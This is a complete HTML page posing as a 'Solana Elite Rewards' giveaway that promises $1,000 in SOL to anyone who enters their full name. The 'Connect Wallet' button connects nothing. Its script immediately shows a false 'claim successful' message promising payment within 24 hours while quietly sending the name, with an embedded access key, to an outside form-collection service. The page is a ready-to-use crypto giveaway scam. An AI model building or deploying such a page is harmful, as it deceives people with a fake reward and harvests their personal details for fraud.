<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .card { width: 85%; max-width: 450px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 60px 40px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); }
        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.6rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; }
        .sub { font-size: 0.9rem; color: #888; margin-bottom: 45px; line-height: 1.6; }
        .ib { text-align: left; margin-bottom: 35px; }
        label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 15px; font-weight: 700; }
        input { width: 100%; background: #111; border: 1px solid #333; border-radius: 15px; padding: 20px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; }
        input:focus { outline: none; border-color: var(--sol-g); background: #151515; }
        .btn { width: 100%; padding: 22px; border: none; border-radius: 16px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.85rem; cursor: pointer; box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); }
        #success-view { display: none; animation: fadeInUp 0.8s ease forwards; }
        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
        .congrats { font-size: 1.05rem; line-height: 1.8; color: #fff; padding: 30px; background: rgba(0, 255, 163, 0.05); border-radius: 25px; border: 1px dashed var(--sol-g); }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="card">
        <div id="form-view">
            <form id="claim-form">
                <!-- ACCESS KEY VERIFIED BELOW -->
                <input type="hidden" name="access_key" value="f072b4f9-8659-434d-a883-cdd2f5165baf">
                
                <h1>CLAIM $1,000 SOL</h1>
                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                
                <div class="ib">
                    <label>Wallet Identity</label>
                    <input type="text" name="Claimer_Name" placeholder="Enter your full name" required>
                </div>

                <input type="hidden" name="from_name" value="Solana Rewards Site">
                <input type="hidden" name="subject" value="New $1,000 SOL Claim Request">
                <input type="hidden" name="redirect" value="false">
                
                <button type="submit" class="btn">CONNECT WALLET</button>
            </form>
        </div>

        <div id="success-view">
            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            document.getElementById('form-view').style.display = 'none';
            document.getElementById('success-view').style.display = 'block';

            const formData = new FormData(form);
            const object = Object.fromEntries(formData);
            const json = JSON.stringify(object);

            fetch('https://web3forms.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: json
            });
        });
    </script>
</body>
</html>
